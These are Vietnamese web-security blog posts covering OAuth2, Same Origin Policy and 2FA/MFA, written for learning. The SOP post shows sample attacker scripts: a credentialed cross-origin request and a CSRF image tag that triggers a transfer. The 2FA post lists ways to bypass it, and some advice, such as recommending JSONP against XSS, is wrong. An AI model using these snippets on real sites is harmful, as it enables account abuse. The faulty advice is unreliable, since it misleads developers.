+<p>Qua bài viết này tôi đã giới thiệu với các bạn về OAuth2: khái niệm, các đối tượng tham gia, các luồng hoạt động , còn việc triển khai thì mình sẽ không trình bày các bạn nên tự tìm hiểu. Còn vấn đề về bảo mật và cách cách bypass thì mình sẽ trình bày vào bài viết sau. Cái gì cũng cần phải lắm chắc lý thuyết trước đã nhé.</p>
+<h2>THAM KHẢO</h2>
+
+
+
+<ul><li><a target="_blank" rel="noopener" href="https://auth0.com/docs/getting-started">https://auth0.com/docs/getting-started</a></li><li><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc6749">https://tools.ietf.org/html/rfc6749</a> ***</li><li><a target="_blank" rel="noopener" href="https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use">https://alexbilbie.com/guide-to-oauth-2-grants/#which-oauth-20-grant-should-i-use</a></li><li><a target="_blank" rel="noopener" href="https://curity.io/resources/develop/oauth/oauth-code-flow/">https://curity.io/resources/develop/oauth/oauth-code-flow/</a></li></ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/06/14/Oauth/" data-id="ckhqle8tl000ao7jm35twg71j" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Same Origin Policy" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/Same%20Origin%20Policy/" class="article-date">
+  <time datetime="2020-06-14T22:20:34.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/Same%20Origin%20Policy/">Same Origin Policy</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>TL;DR<br>Xin chào các bạn, trong bài viết trước mình có giới thiệu với các bạn về  Content Security Policy (CSP) ,hôm nay mình sẽ giới thiệu tiếp một thuật ngữ có liên quan với nó đó là Same Origin Policy (SOP).</p>
+<p>Như các bạn đều biết CSP đươc triển khai ở phía server, chính sách sẽ được gửi về cho phía trình duyệt thông qua HTTP response và trình duyệt sẽ thực thi theo chính sách. Nếu như phía website không cung cấp các chính sách thì phía trình duyệt cũng sử dụng các chính sách bảo mật chung gọi là Same Origin Policy. Nó không phải là một tiêu chuẩn trên internet và mỗi trình duyệt có thể có cách giải thích khác nhau . Ok cùng tìm hiểu nó nào .</p>
+<h2 id="Same-Origin-Plolicy-la-gi"><a href="#Same-Origin-Plolicy-la-gi" class="headerlink" title="Same Origin Plolicy là gì?"></a>Same Origin Plolicy là gì?</h2><p>Same-Origin Policy (có thể tạm gọi là chính sách cùng gốc ) là một tiêu chuẩn về bảo vệ được tích hợp và yêu cầu bắt buộc với các browser hiện đại, , nhằm ngăn chặn việc tương tác giữa các DOM hoặc Script nằm ở các Origin (hoặc địa chỉ) khác nhau, giúp giảm thiểu một số vertor tấn công có thể .</p>
+<h2 id="Tai-sao-can-Same-Origin-Policy"><a href="#Tai-sao-can-Same-Origin-Policy" class="headerlink" title="Tại sao cần Same-Origin Policy ?"></a>Tại sao cần Same-Origin Policy ?</h2><p>Hãy thử tưởng tượng điểu gì xảy ra khi không có SOP, mk sẽ lấy ví dụ cho dễ hiểu:<br>Bạn đăng kí tài hydrasky.ml và các thông tin cá nhận của bạn  được lưu trong một file có url là <a target="_blank" rel="noopener" href="https://hydrasky.mk/user/profile.json">https://hydrasky.mk/user/profile.json</a> .Để truy cập vào file này tất nhiên bạn phải là user hợp lệ và website sẽ check điều này bằng cookie của bạn.</p>
+<p>Nhưng hãy nhớ , khi trình duyệt thực hiện các request HTTP từ Origin này đến Origin khác thì cookie (có chứa session) được lưu trên trình duyệt cũng sẽ được tự động thêm vào làm một phần của request.  (Để hiểu rõ hơn hãy tham khảo bài viết về <a href="http://blog.hydrasky.ml/2020/06/14/Session%20&%20Cookie/">session và cookie</a>) của mình).</p>
+<p>Lợi dụng điều này, attacker tạo 1 website example.com , sử dụng các đoạn mã javascript để request đến file và lừa bạn truy cập vào example.com  để lấy thông tin mà bạn không ngờ đến . </p>
+<p>Ví dụ: <em>examle.com</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var req &#x3D; new XMLHttpRequest();</span><br><span class="line">req.open(&quot;GET&quot;, &quot;https:&#x2F;&#x2F;hydrasky.ml&#x2F;user&#x2F;profile.json&quot;);</span><br><span class="line">req.withCredentials &#x3D; true ; # user&#39;s cookie của hydrasky.ml của bạn sẽ được đính kèm với request  </span><br><span class="line">req.send();</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">Có 3 lưu ý ở đây là:</span><br><span class="line">1. Bên example.com sẽ không thể đọc và chỉnh sửa được user&#39;s cookie của hydrasky.ml</span><br><span class="line">2. Mặc đinh cookie sẽ không được đính kèm vơi request nếu bạn không đặt Credentical &#x3D; true</span><br><span class="line">3. Không có chuyện user&#39;s cookie của example.com được đính kèm request tới hydrasky.ml , điều này chỉ có thể xảy ra khi 2 origin chỉ cùng host (domain&#x2F;subdomain) mà không phân biệt scheme và port.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Áp điều này ra ngoài thực tế nếu như không có SOP, người ta có thể đọc được tin nhắn GMAIL , thông tin Facebook của bạn vẫn vân và vân vân… . Thực sự nguy hiểm!!!<br>SOP sẽ ngăn chặn việc này lại bằng cách chặn quyền “read” vào các tài nguyên ở Origin khác. Như vậy trong trường hợp trên sẽ không có bất kì data nào được trả về và hiển thị trên example.com cả.  </p>
+<p> Nhưng chờ đã ,thế tại sao  “Tôi vẫn có tải hình ảnh và script từ các nguồn gốc khác khi tôi code web ?”. Đây là một câu hỏi rất hay. Trình duyệt cho phép chúng ta sử dụng một vài thẻ để nhúng tài nguyên từ một nguồn gốc khác một cách hợp lệ như nhúng:</p>
+<ul>
+<li>CSS bằng <code>&lt;link&gt;</code> hoặc @import , nhưng cần thêm Content-type hợp lệ.</li>
+<li>image bằng <code>&lt;img &gt;</code> tag. </li>
+<li>video bằng  <code>&lt;video&gt;</code> tag .</li>
+<li>script bằng <code>&lt;script&gt;</code> tag , tuy nhiên nếu như tài nguyên bạn muốn lấy là một API thì sẽ bị chặn.</li>
+<li>forms submit với <code>action</code> </li>
+<li><code>iframe</code> nhưng nó còn phụ thuộc vào  <code>X-Frame-Options</code> và việc bạn sử dụng nó làm gì.</li>
+<li>Ngoài ra còn một số trường hợp ngoại lệ bạn có thể tham khảo ở <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors/same-origin-policy">đây</a>.</li>
+</ul>
+<p>Như vậy, vai trò của Same-Origin Policy không phải là ngăn chặn các trang Web đọc được nguồn dữ liệu từ Website khác, mà chủ yếu là để ngăn chặn các Website đọc các thông tin cá nhân hóa (hay cụ thể hơn, là dữ liệu xác thực), dữ liệu nhạy cảm hoặc nguồn dữ liệu riêng tư của các Website khác.</p>
+<h2 id="Same-Origin-Policy-hoat-dong-nhu-the-nao"><a href="#Same-Origin-Policy-hoat-dong-nhu-the-nao" class="headerlink" title="Same Origin Policy hoạt động như thế nào ?"></a>Same Origin Policy hoạt động như thế nào ?</h2><p>Đầu tiên, Policy sẽ xác định vào cái gì để xác định được rằng nó cùng nguồn gốc ( <strong>Origin</strong> ) ?</p>
+<p>Nó sẽ dựa vào 3 yếu tố là :</p>
+<ul>
+<li>Host</li>
+<li>Port</li>
+<li>Scheme (Http/Https) </li>
+</ul>
+<p>Ví dụ bạn truy cập vào trang <a target="_blank" rel="noopener" href="https://hydrasky.ml/hacking.html">https://hydrasky.ml/hacking.html</a>  bên dưới nó có những đoạn mã đang chạy, thì sẽ có loại trang Web nào khác mà các đoạn Code có thể tương tác với nó ?</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://hydrasky.ml/hacking.html">http://hydrasky.ml/hacking.html</a> : Không thể , bởi vì nó khác protocol (https#http)</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://hydrasky.ml:8080/hacking.html">https://hydrasky.ml:8080/hacking.html</a>: Điều này còn phụ thuộc vào trình duyệt. Bình thường nó sẽ không thể vì nó khác Port (https mặc địch với port 443). Nhưng đối với trình duyệt IE thì nó không quan tâm đến Port thay vào đó nó dùng “Security Zone” nên với IE vẫn có thể tương tác.</p>
+</li>
+<li><p><a href="https://blog.hydrasky.ml/hacking.html">https://blog.hydrasky.ml/hacking.html</a> : Không thể , bởi vì dù là subdomain nhưng nó vẫn coi là khác host. Và  <a target="_blank" rel="noopener" href="http://www.hydrasky.ml/">www.hydrasky.ml</a> cũng không được coi là ngoại lệ.</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a> chắc chắn sẽ không thể rồi.</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://hydrasky.ml/learning.html">https://hydrasky.ml/learning.html</a> mặc dù khác đường dãn nhưng nó vẫn đủ 3 tiêu chí nên có thể .</p>
+</li>
+</ul>
+<h2 id="Cac-van-de-cua-Same-Origin-Policy"><a href="#Cac-van-de-cua-Same-Origin-Policy" class="headerlink" title="Các vấn đề của Same Origin Policy"></a>Các vấn đề của Same Origin Policy</h2><ol>
+<li>SOP ngăn chặn quyền “read”  nhưng không thể can thiệp vào quyền “write” giữa các Origin khác nhau. Quyền “write” ở đây chính là gửi các request thực thi (như chuyển tiền, thay đổi tài khoản) tới các Origin khác. Đó chính là lí do nó không thể chống được một số trường hợp tấn công CSRF.<br>ví dụ:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;example.com&#x2F;trans.php?money&#x3D;1000&amp;reid&#x3D;1234 &gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>Để ngăn chặn cross-origin “write” , bạn nên sử dụng CSRF token cho website của bạn.</p>
+<ol start="2">
+<li>Bên cạnh việc tự định nghĩa các đoạn mã bên trong thẻ <code>&lt;script&gt;</code>, bạn còn có thể sử dung thuộc tính “src” để tải các đoạn mã từ các nơi khác trên Internet:</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;”http:&#x2F;&#x2F;www.jslibrary.com&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Điều này do script thuộc loại code (mã lập trình) chứ không phải là data (dữ liệu) nên không dẫn đến việc lộ lọt thông tin nhạy cảm. </p>
+<ol start="3">
+<li>Cùng với vấn đề thứ 2, Với thuộc tính “src” bạn có thể sử dụng thoải mái các thư viện JavaScript như Jquery .Nhưng trong trường hợp bạn muốn lấy tài nguyên không phải là các mã code js thì sao ?<br>Ý mình ở đây chính là dữ liệu với định dạng JSON.<br>Khi bạn nhận được một chuỗi dưới dạng JSON, bạn cần phải chuyển nó sang dạng Object trước khi làm việc với nó bởi vì dữ liệu được gửi đi dưới dạng ký tự, không phải dưới dạng một đối tượng của JavaScript. Tiếp đây là mới điều cần lưu ý đó là bạn không nên làm việc trưc tiếp với dữ liệu định dạng JSON như ví dụ dưới đây:</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var res &#x3D; ‘&#123;“author”: “hydrasky”, “title”: alert(xss), “rel_date”: “1&#x2F;07&#x2F;2020”&#125;’;</span><br><span class="line">&#x2F;&#x2F; Nguy hiểm </span><br><span class="line">var danger &#x3D; eval(&#39;(&#39;+res+&#39;)&#39;)</span><br><span class="line">&#x2F;&#x2F; Thay vào đo bạn nên làm như này sẽ an toàn</span><br><span class="line">var safe &#x3D; JSON.parse(res);</span><br></pre></td></tr></table></figure>
+
+<p>Khuyến nghị khác ở đây là bạn nên dùng JSONP, viết tắt của <code>JSON with Padding</code>. JSONP giống với JSON, ngoại trừ dữ liệu được đặt bên trong một hàm JavsScript được gọi bởi Client gọi tới nó.</p>
+<p>Hàm này nằm ở trên chính trang hiện tại và với tham số là dữ liệu json được lấy từ server.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mycallback &#x3D; function (data) &#123; </span><br><span class="line">  console.log (data) </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>Và rồi bạn đặt cái này vào website của bạn:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src &#x3D; https:&#x2F;&#x2F;www.example.com&#x2F;data?callback&#x3D;mycallback &gt; &lt;&#x2F; script&gt; </span><br></pre></td></tr></table></figure>
+<p>Bạn nhận được kết quả giống như này :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">mycallback(&#123;“author”: “hydrasky”, “title”: alert(xss), “rel_date”: “1&#x2F;07&#x2F;2020”&#125; &#x2F;&#x2F;JSONP</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>Như vậy bạn có thể tránh được một cuộc tấn công XSS rồi . Nhưng ở một khía cạnh nào đó, việc để dữ liệu ở dạng JSON cũng chính là một yếu tố dẫn đến bypass SOP. </p>
+<ol start="4">
+<li>Trong trường hợp như bạn muốn cho phép các đoạn mã có thể tương tác với các subdomain khác. Ví dụ như ứng dụng web yêu đăng nhập tại một nơi như <a target="_blank" rel="noopener" href="http://store.company.com/">http://store.company.com</a> nhưng cần xác thực tại <a target="_blank" rel="noopener" href="http://login.company.com/">http://login.company.com</a> trước chẳng hạn. Bạn có thể  xử lí như sau:</li>
+</ol>
+<ul>
+<li><strong>Thay đổi Origin</strong> :<br>Rõ ràng host của 2 website trên là khác nhau nên vi phạm SOP, chúng ta có thể thiết lập ở cả 2 nơi về cùng gốc bằng lệnh<br>document.domain = “company.com” - Domain chính ;</li>
+<li><strong>Sử dụng Cross Origin Resource Sharing (CORS)</strong><br>Đây là một tính năng mới được tích hợp trong HTML5. CORS cho phép lấy dữ liệu từ một trang khác thông qua XMLHttpRequest. Lập trình viên cần thiết lập request gửi đi có trường<br>Origin: <a target="_blank" rel="noopener" href="http://company.com/">http://company.com</a><br>Và trong response trả về cần có:<br>Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="http://company.com/">http://company.com</a></li>
+</ul>
+<p>Đây là biện pháp hữu hiệu và an toàn hơn sử dụng JSONP hay thay đổi Origin nhưng yêu cầu cấu hình CORS thật chính xác, nếu không chính điều này sẽ cho phép attacker lấy đi dữ liệu của bạn . (MÌnh sẽ có bài viết về lỗ hổng này nha)</p>
+<p>##Tổng kết</p>
+<p>Ok , Như vậy với SOP giúp tăng tính bảo mật trên trình duyệt của người dùng nhưng vẫn chưa cao , tham khảo thêm <a target="_blank" rel="noopener" href="http://powerofcommunity.net/poc2008/kuza55.pdf">Yếu điểm của SOP</a>.</p>
+<div class="video-container"><iframe src="https://www.youtube.com/embed/UfYfID_r7-U" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+<p> Để cải thiện điều này có thể sử dụng SOP , CSP và CORS cùng nhau như thế sẽ rất an toàn cho phía Client  .  Qua bài viết này chúng ta có thể hiểu được phần nào việc giao tiếp giữa các Origin.<br>Cảm ơn các bạn đã đọc và theo dõi, đón chào các bạn ở các bài viết tiếp theo.</p>
+<h2 id="Link-tham-khao"><a href="#Link-tham-khao" class="headerlink" title="Link tham khảo"></a>Link tham khảo</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://web.dev/same-origin-policy/">https://web.dev/same-origin-policy/</a></li>
+<li><a target="_blank" rel="noopener" href="https://whitehat.vn/threads/same-origin-policy.4731/">https://whitehat.vn/threads/same-origin-policy.4731/</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@minosagap/same-origin-policy-and-ways-to-bypass-250effdc4a12">https://medium.com/@minosagap/same-origin-policy-and-ways-to-bypass-250effdc4a12</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/web-security-zone/what-is-same-origin-policy/">https://www.acunetix.com/blog/web-security-zone/what-is-same-origin-policy/</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/06/14/Same%20Origin%20Policy/" data-id="ckhqle8tt000jo7jmhdt097k3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Authentication" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/Authentication/" class="article-date">
+  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/Authentication/">Two-Factor Authentication &amp; Multil-Factor Authentication</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+         <img src="/images/OAUTH/si-advanced-authentication-feature.webp" class="[class names]" title="[300] [200] " alt="Xác thực đa yếu tố">
+
+<p>Xin chào các bạn , trong bài viết này mình sẽ giới thiệu về 2 phương thức bảo mật được ưa dùng hiện nay, cách thức hoạt động và mức độ quan trọng hay ảnh hướng như nào đến người dùng khi không dùng hay bị bypass.</p>
+<p>Như các bạn đều biết việc xác thực cổ điển là dựa vào user/password (hay Basic Authentication) là một phương thức đã lỗi thời và rất dễ bị bẻ khóa.  Cùng với đó người dùng thường có thói quen dùng một mật khẩu cho nhiều tài khoản hay sử dụng mật khẩu đơn giản để dễ nhớ. Dẫn đến việc kể tấn công có thể đoán ra hay sử dụng các công cụ để thực hiện cuộc tấn công bruteforce hoặc diretory attack chiếm lấy tài khoản một cách dễ dàng. Vì vậy điều cần thiết được đặt ra  là cung cấp cho người dùng những cách bổ sung để bảo vệ tài khoản của họ.</p>
+<p>Xác thực hai yếu tố hay đa yếu tố (2FA hoặc MFA) là phương thức bảo mật mới đã được bổ sung vào quá trình xác thực  và ngày càng trở nên phổ biến.Vậy 2FA và MFA là gì và chúng có thể giúp bảo vệ người dùng như thế nào?</p>
+<img src="/images/OAUTH/askaquestion_image.jpg" class="[class names]" title="[500] [500] " alt="2FA VS MFA">
+
+
+<p>Two-Factor (2FA) và Multi-Factor Authentication hay còn gọi là Bảo mật nhiều lớp, là một phương thức để chứng thực user bằng việc combine 2 hoặc nhiều hơn các factors khác nhau.</p>
+<p>Bản chất Two-Factor Authentication (2FA) - cũng được coi là Multi-Factor authentication (MFA) nhưng MFA lại không phải là 2FA, Tại sao lại vậy ???</p>
+<img src="/images/OAUTH/ss.jpg" class="[class names]" title="[500] [500] " alt="Oauth2">
+
+
+
+<p>Sự khác biệt dễ thấy nhất giữa xác thực đa yếu tố và xác thực hai yếu tố là 2FA chỉ sử dụng hai trong số các yếu tố có sẵn để xác minh danh tính người dùng, trong khi MFA có thể sử dụng ba hoặc nhiều hơn để kiểm tra.</p>
+<p>Xét về tính bảo mật, mặc dù 2FA hiện vẫn đang là phương thức xác thực rất là hữu hiệu nhưng không phải là an toàn thực sự. Đã có rất nhiều cách bypass 2FA  được thực hiện, mặc dù hầu hến đến từ việc cấu hình của người quản trị hoặc đôi khi từ chính sự thiếu hiểu biết từ người dùng nhưng rõ ràng rằng 2FA không còn đủ để ngăn chặn hoàn toàn các vi phạm dữ liệu và đó là lí do sinh ra MFA. MFA không chỉ sử dụng nhiều yếu tố xác thực có sẵn mà nó còn bổ sung thêm các yếu tố  theo ngữ cảnh như thời gian,vị trí …</p>
+<figure class="wp-block-image"><img src="https://image.slidesharecdn.com/smspasscode-141101172311-conversion-gate02/95/welcome-to-the-3rd-generation-in-user-authentication-7-638.jpg?cb=1414931604" alt="Welcome to the 3rd generation in user authentication"/></figure>
+
+
+
+<p>Oh như  vậy tại sao vẫn sử dụng 2FA khi đã có MFA ? Dễ hiểu thôi , nhiều xác thực hơn có nghĩa là bảo mật hơn nhưng sẽ phức tạp hơn ,người dùng có thể thấy rất khó chịu với việc này nên các ứng dụng nhỏ và vừa thường sử dụng 2FA cùng với các yếu tố xác thực  mức độ tốt hơn thay vì sử dụng nhiều yếu tố để xác thực như MFA. Còn với các ông lớn như Facebook, Google … đều đã áp dụng MFA cho người dùng tùy chọn và MFA rất cần thiết cho lưu trữ đám mây (Cloud).</p>
+<h2>Các yếu tố xác thực chính</h2>
+
+
+
+<figure class="wp-block-image"><img src="https://www.secsign.com/wp-content/uploads/2017/08/2FA-icon.png" alt="Two-Factor Authentication (2FA) vs. Two-Step Authentication (2SA ..."/></figure>
+
+
+
+<p>Nếu không dựa vào mật khẩu vậy phương thức này sẽ sử dụng điều gì để xác thực ? Có thể kể đến 4 yếu tố :</p>
+<h4>Kiến thức hay sự hiểu biết</h4>
+
+
+
+<p>Ví dụ là sử dụng tính năng xác thực bằng bạn bè , như zalo sẽ yêu cầu bạn chọn dúng 3 tài khoản  trong danh sách bạn bè để xác thực đó chính là bạn. Kiến thức ở đây là một cái gì đó nằm trong kiến thức liên quan đến tài khoản của người dùng.Đây có thể là mật khẩu, tên người dùng,bạn bè, câu trả lời cho câu hỏi bảo mật mà bạn đặt sẵn, mã PIN hoặc địa chỉ. </p>
+<h4>Sở hữu</h4>
+
+
+
+<p>Loại yếu tố xác thực này đề cập đến thứ mà người dùng sở hữu, thiết bị (chỉ cho phép đăng nhập  ở điện thoại hoặc máy tính của bạn )hoặc đối tượng sẽ cung cấp thêm thông tin cần thiết để xác minh (email, sdt) . Ví dụ như mã OTP được gửi qua SMS hoặc các ừng dụng token, token secret qua email…</p>
+<img src="/images/OAUTH/tpbank-etoken.jpg" class="[class names]" title="[400] [400] " alt="Software tokens">
+
+
+<h4>Cố Hữu (Vốn có)</h4>
+
+
+
+<p>Đây là những yếu tố liên quan đến người dùng và thường là các phương pháp sinh trắc học như nhận dạng vân tay , khuôn mặt , giọng nói hoặc mống mắt . </p>
+<h4>Vị trí</h4>
+
+
+
+<p>Mặc dù yếu tố xác thực vị trí có thể không được sử dụng thường xuyên như các yếu tố khác, tuy nhiên nó vẫn tạo thành một yếu tố để xác thực hữu hiệu.Theo định nghĩa, nó đề cập đến bạn đang ở đâu.Vị trí của bạn được theo dõi và xác định bằng các công nghệ khác nhau theo dõi địa chỉ IP của bạn và họ thông báo cho bạn nếu họ phát hiện ra việc truy cập ở một vị trí bất thường (VD: bạn ở HN nhưng tài khoản lại được truy cập ở HCM) .Xác định vị trí của bạn cũng có thể được thực hiện bằng địa chỉ MAC hoặc thiết bị có trình theo dõi GPS.</p>
+<h2>Cơ chế hoạt động internally của 2FA</h2>
+
+
+<p>Khi bạn enable 2FA cho tài khoản của mình,mỗi lần yêu cầu xác thực 2fa, bạn sẽ nhận được một secret key based 32. Tùy vào mức độ security, độ dài của secret key có thể là 80, 128 hoặc 160 bit.</p>
+<p>Các authenticator application sẽ scan secret này dưới dạng QR code (hoặc manually) và dùng nó để generate ra một HMAC-SHA1. Chuỗi HMAC này có thể là một trong 2 dạng:</p>
+<ul><li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm">TOTP</a></li><li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/HMAC-based_One-time_Password_algorithm">HOTP</a></li></ul>
+
+
+<p>Sau đó HMAC này sẽ được extracted và lấy ra 1 số int 4 byte, đó chính là code.</p>
+<p>Một mã code sẽ valid trong 30 giây. Tuy nhiên không phải ai cũng có clock synced giống nhau, vì network latency các kiểu nên thường mọi người hay cho phép ở phạm vi cộng trừ 1 code, tức là 1 code sẽ valid trong 1 phút 30 giây. Điều này có thể giảm tính an toàn, nhưng lại tăng sự trải nghiệm đáng kể.</p>
+<h3>Backup codes</h3>
+
+
+
+<p>Backup codes hay recovery codes sẽ được sử dụng trong trường hợp bạn không thể sử dụng điện thoại, bạn có thể dùng chúng để đăng nhập. Có 2 loại backup codes:</p>
+<ul><li>Multiple backup codes: Ví dụ github sẽ cho bạn 10 codes, và mỗi code sẽ được sử dụng 1 lần.</li><li>Single backup code: Bạn dùng cái code này đồng nghĩa với việc bạn có thể đăng nhập, nhưng phải setup lại 2FA (nó assume bạn bị mất điện thoại).</li></ul>
+
+
+<h3>Quy trình xác thực bằng 2FA</h3>
+
+
+<div class="video-container"><iframe src="https://www.youtube.com/embed/0mvCeNsTa1g" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+
+
+<p>Dưới đây là cách xác thực 2FA hoạt động:</p>
+<ol><li>Người dùng được nhắc đăng nhập bằng ứng dụng hoặc trang web.</li><li>Người dùng nhập những gì họ biết -  username/password ,email .Sau đó, máy chủ của trang web tìm thấy kết quả hợp lệ và định danh người dùng.</li><li>Trang web sau đó sẽ sử dụng các yếu tố sở hữu duy nhất  như email, sdt có liên kết với tài khoản của người dùng  để gửi one time code dưới dạng một token hoặc text message.</li><li>Sau đó, người dùng nhập mã một lần được tạo trong bước 3.</li><li>Sau khi cung cấp cả hai yếu tố, người dùng được xác thực và cấp quyền truy cập vào ứng dụng hoặc trang web.</li></ol>
+
+
+<h3> **Bypass xác thực ** 2FA</h3>
+
+<p>Dưới đây là  một số cách thồng thường mà các hacker hay sử dụng để vượt qua phương thức bảo mật này  :</p>
+<ul><li>Burteforce : Nó là biện pháp phổ biến và hay dùng nhất do các code thường chỉ có từ 3 dến 6 kĩ tự và hầu như chỉ là số. Vì vậy nếu khồng có giới hạn request thì việc sử dụng bruteforce tỷ lệ  thành công rất là cao.</li><li>Race conditions: Bằng việc sử dụng đồng thời nhiều request cùng một thời điểm khiến server không kịp xử lí đãn đến tạo ra các giá trị code đã sử dụng trước đó hoặc chưa sử dụng tại một thời điểm sau đó. Và kẻ tấn công có thể tái sử dụng nó. </li><li>Via Oauth: Tích hợp Oauth là một cơ chế đăng nhập của bên thứ ba cho phép người dùng đăng nhập bằng tài khoản bên thứ ba.Để bypass, kẻ tấn công phải có quyền truy cập vào tài khoản tích hợp Oauth để đăng nhập thay vì dùng tài khoản trực tiếp của người dùng.</li><li>Via session management :Phương pháp này dựa vào việc bỏ qua cơ chế xác thực hai yếu tố bằng cách sử dụng các chức năng như đặt lại mật khẩu, Về cơ bản,ngay sau khi sử dụng token để đặt lại mật khẩu nó sẽ  duy trì một phiên với ứng dụng  , dẫn đến việc bypass.</li></ul>
+
+
+<p>Ngoài ra còn rất nhiều cách khác đến từ vấn đề logic flow, người dùng … Bạn có thể tham khảo từ writeup, tip/trick của các hacker , bughunter …</p>
+<figure class="wp-block-image"><img src="https://pbs.twimg.com/media/EW8vBWEX0AAxcVj?format=jpg&name=large" alt="Image"/></figure>
+
+<p>Một tip bypass 2FA từ <a rel="noreferrer noopener" href="https://twitter.com/hackerscrolls/status/1256276376019230720/photo/1" target="_blank">@hackerscrolls</a></p>
+<p>Ok kết luận lại, với 2FA va MFA việc bảo mật sẽ tốt hơn rất nhiều nhưng yếu tố quan trọng nhất vẫn phụ thuộc vào con người. So với 2FA, thì MFA sẽ cố phần nhỉnh hơn về độ an toàn nhưng lại phức tạp, khá tốn chi phí, thời gian xác thực  vì vậy nên áp dụng mỗi phương thức vào môi trường hợp lệ. </p>
+<p>Cảm ơn các bạn đã đọc bài. Xin chào và hẹn gặp lại !!!   </p>
+<h2>Tham khảo </h2>
+
+
+
+<ul><li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Multi-factor_authentication">https://en.wikipedia.org/wiki/Multi-factor_authentication</a></li><li><a target="_blank" rel="noopener" href="https://kipalog.com/posts/Two-Factor-Authentication-va-ung-dung">https://kipalog.com/posts/Two-Factor-Authentication-va-ung-dung</a></li><li><a target="_blank" rel="noopener" href="https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f">https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f</a></li><li><a target="_blank" rel="noopener" href="https://securitytrails.com/blog/two-factor-auth-vs-multi-factor-auth">https://securitytrails.com/blog/two-factor-auth-vs-multi-factor-auth</a></li><li><a target="_blank" rel="noopener" href="https://www.loginradius.com/blog/2019/06/what-is-multi-factor-authentication/">https://www.loginradius.com/blog/2019/06/what-is-multi-factor-authentication/</a></li></ul>
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
